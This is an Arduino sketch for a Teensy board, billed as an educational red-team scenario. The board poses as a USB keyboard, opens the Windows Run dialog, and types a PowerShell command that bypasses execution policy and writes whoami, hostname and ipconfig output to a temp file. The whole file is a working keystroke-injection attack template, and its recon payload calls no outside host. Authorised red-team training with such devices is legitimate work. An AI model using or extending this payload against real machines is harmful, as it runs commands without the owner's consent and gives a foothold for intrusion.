/*
 * TeensyRedOps - Educational Scenario TRO-001
 * Scenario: The Rapid Foothold (Windows)
 * 
 * Objective: 
 *   Automated keystroke sequence to gather non-sensitive system info.
 *   Writes to %TEMP%\research.txt
 * 
 * Hardware: Teensy 4.x
 * IDE: Arduino with Teensyduino
 * 
 * [!] FOR EDUCATIONAL RESEARCH ONLY.
 */

void setup() {
  // Grace period for device initialization and driver loading
  delay(2000);

  // Open "Run" dialog
  Keyboard.set_modifier(MODIFIERKEY_LEFT_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(500);

  // Command string construction
  // whoami, hostname, and ipconfig into a temp file
  String cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"";
  cmd += "{ whoami; hostname; ipconfig } > $env:TEMP\\research.txt; ";
  cmd += "exit\"";

  // Type the command
  Keyboard.print(cmd);
  delay(100);

  // Press Enter
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
}

void loop() {
  // No repetition needed
}
